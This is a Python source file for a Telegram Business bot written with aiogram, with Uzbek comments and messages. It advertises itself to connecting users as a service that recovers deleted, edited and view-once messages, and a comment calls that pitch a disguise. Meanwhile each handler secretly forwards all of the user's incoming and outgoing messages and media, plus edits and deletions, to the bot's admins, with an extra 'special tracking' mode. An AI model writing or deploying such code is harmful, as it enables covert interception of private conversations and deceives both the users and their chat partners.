import html
import logging
from typing import Optional
from aiogram import Router, F, Bot
from aiogram.types import (
    BusinessConnection,
    Message,
    BusinessMessagesDeleted
)

import database as db

logger = logging.getLogger(__name__)

business_router = Router()

async def broadcast_to_admins(bot: Bot, text: str, reply_markup=None):
    """Barcha adminlarga xabar yuborish"""
    admin_ids = await db.get_all_admin_ids()
    for admin_id in admin_ids:
        try:
            await bot.send_message(
                chat_id=admin_id,
                text=text,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
        except Exception as e:
            logger.error(f"Error sending message to admin {admin_id}: {e}")

# ==========================================
# 1. Telegram Business Ulanish / Uzilish (Connection)
# ==========================================
@business_router.business_connection()
async def handle_business_connection(conn: BusinessConnection, bot: Bot):
    user = conn.user
    is_active = conn.is_enabled

    logger.info(f"Business connection update: User={user.id} ({user.full_name}), Enabled={is_active}")

    # Bazadagi holatni yangilash
    await db.set_user_connection(user.id, conn.id, is_active)

    user_data = await db.get_user(user.id)
    if not user_data:
        await db.register_or_update_user(
            user_id=user.id,
            first_name=user.first_name,
            last_name=user.last_name,
            username=user.username,
            business_connection_id=conn.id,
            tracking_type="normal",
            is_active=1 if is_active else 0
        )
        user_data = await db.get_user(user.id)

    code_used = user_data.get("code_used") or "Kodsiz"
    track_mode = "🚨 Maxsus Kuzatuv" if user_data.get("tracking_type") == "special" else "🔹 Oddiy Kuzatuv"
    user_mention = f"@{user.username}" if user.username else "mavjud_emas"

    # Adminga bildirishnoma
    if is_active:
        admin_msg = (
            f"✅ <b>Yangi foydalanuvchi ulandi!</b>\n\n"
            f"👤 <b>Ism:</b> {html.escape(user.full_name)}\n"
            f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
            f"🔗 <b>Username:</b> {user_mention}\n"
            f"🔑 <b>Kod:</b> <code>{code_used}</code>\n"
            f"📊 <b>Rejim:</b> {track_mode}\n"
            f"⚡️ <b>Holat:</b> Telegram Business Chatbot muvaffaqiyatli faollashtirildi"
        )
        # Foydalanuvchiga muvaffaqiyatli ulanish xabari (Spy/Anti-delete himoya niqobi)
        try:
            user_welcome = (
                "🛡 <b>Kuzatuv va Himoya muvaffaqiyatli ishga tushirildi!</b>\n\n"
                "✅ Botingiz Telegram hisobingizga muvaffaqiyatli ulandi.\n"
                "Endi suhbatdoshlaringiz yozib o'chirib yuborgan xabarlari, tahrirlangan matnlari hamda "
                "o'chib ketuvchi (view-once) foto va videolari shu yerga yuboriladi."
            )
            await bot.send_message(chat_id=user.id, text=user_welcome, parse_mode="HTML")
        except Exception as e:
            logger.warning(f"Could not send welcome to user {user.id}: {e}")
    else:
        admin_msg = (
            f"⚠️ <b>Foydalanuvchi botni uzdi / o'chirdi!</b>\n\n"
            f"👤 <b>Ism:</b> {html.escape(user.full_name)}\n"
            f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
            f"🔗 <b>Username:</b> {user_mention}\n"
            f"🔑 <b>Kodi:</b> <code>{code_used}</code>\n"
            f"📊 <b>Holat:</b> Nofaol (Bot Telegram Business sozlamalaridan o'chirildi)"
        )

    await broadcast_to_admins(bot, admin_msg)

# ==========================================
# 2. Xabarlarni Kuzatish (Business Message)
# ==========================================
@business_router.business_message()
async def handle_business_message(message: Message, bot: Bot):
    conn_id = message.business_connection_id
    if not conn_id:
        return

    # Foydalanuvchini bazadan aniqlaymiz
    user = await db.get_user_by_connection(conn_id)
    user_name = user.get("first_name", "Foydalanuvchi") if user else "Foydalanuvchi"
    is_special = user and user.get("tracking_type") == "special"
    tracked_user_id = user.get("user_id") if user else None

    # Xabar kimdan va kimgacha ekanligini aniqlash
    is_outgoing = (message.from_user.id == tracked_user_id) if tracked_user_id else False

    chat_partner = message.chat.full_name or message.chat.username or "Suhbatdosh"
    sender_mention = f"@{message.from_user.username}" if message.from_user.username else (message.from_user.full_name or "Noma'lum")
    recipient_mention = f"@{message.chat.username}" if message.chat.username else chat_partner

    if is_outgoing:
        action_text = f"📤 Yubordi (Kimgacha: {recipient_mention})"
    else:
        action_text = f"📥 Qabul qildi (Kimdan: {sender_mention})"

    # Xabarning matni yoki media tavsifi
    msg_text = message.text or message.caption or ""
    media_type = None
    file_id = None

    if message.photo:
        media_type = "photo"
        file_id = message.photo[-1].file_id
    elif message.video:
        media_type = "video"
        file_id = message.video.file_id
    elif message.video_note:
        media_type = "video_note"
        file_id = message.video_note.file_id
    elif message.voice:
        media_type = "voice"
        file_id = message.voice.file_id
    elif message.audio:
        media_type = "audio"
        file_id = message.audio.file_id
    elif message.document:
        media_type = "document"
        file_id = message.document.file_id
    elif message.sticker:
        media_type = "sticker"
        file_id = message.sticker.file_id

    # Keshga saqlaymiz (Tahrirlash va o'chirishni aniqlash uchun)
    await db.save_cached_message(
        business_connection_id=conn_id,
        chat_id=message.chat.id,
        message_id=message.message_id,
        sender_id=message.from_user.id,
        sender_name=message.from_user.full_name,
        sender_username=message.from_user.username,
        text=msg_text or (f"[{media_type.upper()}]" if media_type else ""),
        media_type=media_type,
        file_id=file_id,
        caption=message.caption
    )

    if tracked_user_id:
        await db.increment_user_messages(tracked_user_id)

    # 1) FOYDALANUVCHIGA SPY XIZMATI (O'chib ketuvchi / Kiruvchi media saqlash)
    # Agar kiruvchi media bo'lsa, foydalanuvchiga ham yetkaziladi (Spy dek ishlashi uchun)
    if not is_outgoing and tracked_user_id and media_type:
        user_header = (
            f"💾 <b>Suhbatdoshingiz yuborgan media saqlandi:</b>\n"
            f"👤 <b>Kimdan:</b> {html.escape(sender_mention)}\n"
            f"💬 <b>Chat:</b> {html.escape(chat_partner)}"
        )
        try:
            if media_type == "photo":
                cap = f"{user_header}\n💬 <b>Izoh:</b> {html.escape(msg_text)}" if msg_text else user_header
                await bot.send_photo(chat_id=tracked_user_id, photo=file_id, caption=cap, parse_mode="HTML")
            elif media_type == "video":
                cap = f"{user_header}\n💬 <b>Izoh:</b> {html.escape(msg_text)}" if msg_text else user_header
                await bot.send_video(chat_id=tracked_user_id, video=file_id, caption=cap, parse_mode="HTML")
            elif media_type == "video_note":
                await bot.send_message(chat_id=tracked_user_id, text=f"{user_header}\n⭕️ <b>Dumaloq video (Video Note):</b>", parse_mode="HTML")
                await bot.send_video_note(chat_id=tracked_user_id, video_note=file_id)
            elif media_type == "voice":
                await bot.send_voice(chat_id=tracked_user_id, voice=file_id, caption=f"{user_header}\n🎤 <b>Ovozli xabar:</b>", parse_mode="HTML")
        except Exception as e:
            logger.debug(f"User media relay info: {e}")

    # 2) ADMINGA TO'LIQ KUZATUV XABARINI YUBORISH
    if is_special:
        admin_header = (
            f"MAXSUS KUZATUV:\n\n"
            f"👤 <b>Foydalanuvchi:</b> {html.escape(user_name)}\n"
            f"📍 <b>Harakat:</b> {html.escape(action_text)}"
        )
    else:
        admin_header = (
            f"<b>foydalanuvchi:</b> {html.escape(user_name)}\n"
            f"<b>Harakat:</b> {html.escape(action_text)}"
        )

    admin_ids = await db.get_all_admin_ids()
    for admin_id in admin_ids:
        try:
            if media_type == "photo":
                caption = f"{admin_header}\n💬 <b>Xabar:</b> {html.escape(msg_text)}" if msg_text else f"{admin_header}\n📷 <i>[Rasm / O'chib ketuvchi rasm]</i>"
                await bot.send_photo(chat_id=admin_id, photo=file_id, caption=caption, parse_mode="HTML")
            elif media_type == "video":
                caption = f"{admin_header}\n💬 <b>Xabar:</b> {html.escape(msg_text)}" if msg_text else f"{admin_header}\n🎥 <i>[Video]</i>"
                await bot.send_video(chat_id=admin_id, video=file_id, caption=caption, parse_mode="HTML")
            elif media_type == "video_note":
                await bot.send_message(chat_id=admin_id, text=f"{admin_header}\n⭕️ <b>Dumaloq video (Video Note):</b>", parse_mode="HTML")
                await bot.send_video_note(chat_id=admin_id, video_note=file_id)
            elif media_type == "voice":
                caption = f"{admin_header}\n🎤 <b>Ovozli xabar:</b>"
                await bot.send_voice(chat_id=admin_id, voice=file_id, caption=caption, parse_mode="HTML")
            elif media_type == "document":
                caption = f"{admin_header}\n📁 <b>Hujjat:</b> {html.escape(msg_text)}"
                await bot.send_document(chat_id=admin_id, document=file_id, caption=caption, parse_mode="HTML")
            elif media_type == "sticker":
                await bot.send_message(chat_id=admin_id, text=f"{admin_header}\n🎭 <b>Stiker:</b>", parse_mode="HTML")
                await bot.send_sticker(chat_id=admin_id, sticker=file_id)
            elif media_type == "audio":
                caption = f"{admin_header}\n🎵 <b>Audio:</b> {html.escape(msg_text)}"
                await bot.send_audio(chat_id=admin_id, audio=file_id, caption=caption, parse_mode="HTML")
            else:
                full_text = f"{admin_header}\n💬 <b>Xabar:</b> {html.escape(msg_text)}"
                await bot.send_message(chat_id=admin_id, text=full_text, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error forwarding business message to admin {admin_id}: {e}")

# ==========================================
# 3. Tahrirlangan Xabarlarni Kuzatish (Edited Message)
# ==========================================
@business_router.edited_business_message()
async def handle_edited_business_message(message: Message, bot: Bot):
    conn_id = message.business_connection_id
    if not conn_id:
        return

    cached = await db.get_cached_message(conn_id, message.chat.id, message.message_id)
    old_text = cached.get("text", "Aniqlanmadi (avval saqlanmagan)") if cached else "Aniqlanmadi"
    new_text = message.text or message.caption or "[Media xabar]"

    sender = f"@{message.from_user.username}" if message.from_user.username else (message.from_user.full_name or "Noma'lum")
    chat_title = message.chat.full_name or message.chat.title or "Shaxsiy chat"

    # Foydalanuvchini bazadan olamiz
    user = await db.get_user_by_connection(conn_id)
    tracked_user_id = user.get("user_id") if user else None

    # Keshdagi matnni yangilab qo'yamiz
    await db.update_cached_message_text(conn_id, message.chat.id, message.message_id, new_text)

    # 1) FOYDALANUVCHIGA BILDIRISHNOMA (Agar unga yozilgan bo'lsa)
    if tracked_user_id and message.from_user.id != tracked_user_id:
        user_edit_msg = (
            f"✏️ <b>Suhbatdoshingiz xabarni tahrirladi!</b>\n\n"
            f"👤 <b>Kimdan:</b> {html.escape(sender)}\n"
            f"💬 <b>Chat:</b> {html.escape(chat_title)}\n\n"
            f"▫️ <b>Eski matn:</b>\n"
            f"<code>{html.escape(old_text)}</code>\n\n"
            f"▫️ <b>Yangi matn:</b>\n"
            f"<code>{html.escape(new_text)}</code>"
        )
        try:
            await bot.send_message(chat_id=tracked_user_id, text=user_edit_msg, parse_mode="HTML")
        except Exception as e:
            logger.debug(f"Could not send edit notification to user {tracked_user_id}: {e}")

    # 2) ADMINGA YUBORISH (Skrinshotdagi format)
    admin_text = (
        f"✏️ <b>Xabar tahrirlandi!</b>\n\n"
        f"👤 <b>Kimdan:</b> {html.escape(sender)}\n"
        f"💬 <b>Chat:</b> {html.escape(chat_title)}\n\n"
        f"▫️ <b>Eski matn:</b>\n"
        f"<code>{html.escape(old_text)}</code>\n\n"
        f"▫️ <b>Yangi matn:</b>\n"
        f"<code>{html.escape(new_text)}</code>"
    )

    await broadcast_to_admins(bot, admin_text)

# ==========================================
# 4. O'chirilgan Xabarlarni Kuzatish (Deleted Messages)
# ==========================================
@business_router.deleted_business_messages()
async def handle_deleted_business_messages(event: BusinessMessagesDeleted, bot: Bot):
    conn_id = event.business_connection_id
    chat_title = event.chat.full_name or event.chat.title or "Shaxsiy chat"

    user = await db.get_user_by_connection(conn_id)
    tracked_user_id = user.get("user_id") if user else None

    for msg_id in event.message_ids:
        cached = await db.get_cached_message(conn_id, event.chat.id, msg_id)
        if cached:
            cached_text = cached.get("text") or cached.get("caption") or f"[{cached.get('media_type', 'media').upper()}]"
            sender_name = cached.get("sender_username")
            sender_str = f"@{sender_name}" if sender_name else (cached.get("sender_name") or "Noma'lum")
            media_type = cached.get("media_type")
            file_id = cached.get("file_id")
            is_from_user = (cached.get("sender_id") == tracked_user_id) if tracked_user_id else False

            # 1) FOYDALANUVCHIGA YUBORISH (Agar suhbatdoshi o'chirgan bo'lsa)
            if tracked_user_id and not is_from_user:
                user_del_msg = (
                    f"🗑 <b>Suhbatdoshingiz o'chirib yuborgan xabar saqlandi!</b>\n\n"
                    f"👤 <b>Kimdan:</b> {html.escape(sender_str)}\n"
                    f"💬 <b>Chat:</b> {html.escape(chat_title)}\n\n"
                    f"▫️ <b>O'chirilgan matn:</b>\n"
                    f"<code>{html.escape(cached_text)}</code>"
                )
                try:
                    if media_type == "photo" and file_id:
                        await bot.send_photo(chat_id=tracked_user_id, photo=file_id, caption=user_del_msg, parse_mode="HTML")
                    elif media_type == "video" and file_id:
                        await bot.send_video(chat_id=tracked_user_id, video=file_id, caption=user_del_msg, parse_mode="HTML")
                    elif media_type == "voice" and file_id:
                        await bot.send_voice(chat_id=tracked_user_id, voice=file_id, caption=user_del_msg, parse_mode="HTML")
                    elif media_type == "video_note" and file_id:
                        await bot.send_message(chat_id=tracked_user_id, text=user_del_msg, parse_mode="HTML")
                        await bot.send_video_note(chat_id=tracked_user_id, video_note=file_id)
                    else:
                        await bot.send_message(chat_id=tracked_user_id, text=user_del_msg, parse_mode="HTML")
                except Exception as e:
                    logger.debug(f"Could not relay deleted msg to user {tracked_user_id}: {e}")

            # 2) ADMINGA YUBORISH
            admin_text = (
                f"🗑 <b>Xabar o'chirildi!</b>\n\n"
                f"👤 <b>Kimdan:</b> {html.escape(sender_str)}\n"
                f"💬 <b>Chat:</b> {html.escape(chat_title)}\n\n"
                f"▫️ <b>O'chirilgan xabar:</b>\n"
                f"<code>{html.escape(cached_text)}</code>"
            )
        else:
            admin_text = (
                f"🗑 <b>Xabar o'chirildi!</b>\n\n"
                f"💬 <b>Chat:</b> {html.escape(chat_title)}\n"
                f"🆔 <b>Message ID:</b> <code>{msg_id}</code>\n"
                f"▫️ <i>(Keshda saqlanmagan xabar)</i>"
            )

        await broadcast_to_admins(bot, admin_text)
